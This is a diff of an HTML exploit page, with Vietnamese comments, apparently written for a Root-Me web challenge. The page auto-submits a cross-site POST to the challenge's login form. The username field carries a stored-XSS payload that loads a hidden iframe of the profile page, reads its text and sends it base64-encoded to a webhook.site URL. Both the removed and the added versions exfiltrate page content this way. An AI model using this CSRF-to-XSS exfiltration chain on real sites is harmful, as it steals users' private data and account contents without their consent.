@@ -2,27 +2,43 @@
 <html>
 <body>
     <script>
-        // 1. Mở trang chủ (nơi chứa secret) và đặt tên cửa sổ
-        var win = window.open("http://challenge01.root-me.org:58003/", "secret_vault");
+        // 1. Không cần mở window.open nữa để tránh bị chặn Popup
+        // Chúng ta sẽ thực hiện XSS trực tiếp qua POST
+        
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'http://challenge01.root-me.org:58003/login';
+        // Bạn có thể giữ hoặc bỏ target="_blank", nhưng nên để để dễ quan sát
+        form.target = "_blank"; 
 
-        setTimeout(() => {
-            // 2. Tự động POST XSS
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'http://challenge01.root-me.org:58003/login';
-            form.target = "_blank"; 
+        const input = document.createElement('input');
+        input.name = 'username';
+        
+        /* LOGIC PAYLOAD:
+           1. Tạo một iframe ẩn.
+           2. Trỏ src của iframe về trang chứa secret (thường là / hoặc /profile).
+           3. Đợi iframe load xong (onload).
+           4. Đọc nội dung và gửi về Webhook.
+        */
+        input.value = `
+<script>
+    var ifr = document.createElement('iframe');
+    ifr.src = 'http://challenge01.root-me.org:58003/profile'; 
+    ifr.style.display = 'none';
+    ifr.onload = function() {
+        try {
+            var secretData = ifr.contentDocument.documentElement.innerText;
+            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d=' + btoa(secretData));
+        } catch(e) {
+            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?err=' + btoa(e.message));
+        }
+    };
+    document.body.appendChild(ifr);
+<\/script>`.replace(/\n/g, ""); // Xóa dấu xuống dòng để tránh lỗi syntax
 
-            const input = document.createElement('input');
-            input.name = 'username';
-            
-            // Payload viết trên một dòng duy nhất để tránh lỗi Syntax do xuống dòng
-            // Sử dụng window.name để định danh thay vì gọi window.open lần nữa
-            input.value = `<script>try{var s=window.open('','secret_vault').document.body.innerText;fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d='+btoa(s))}catch(e){fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?e='+btoa(e.message))}<\/script>`;
-
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-        }, 2000);
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
     </script>
 </body>
 </html>
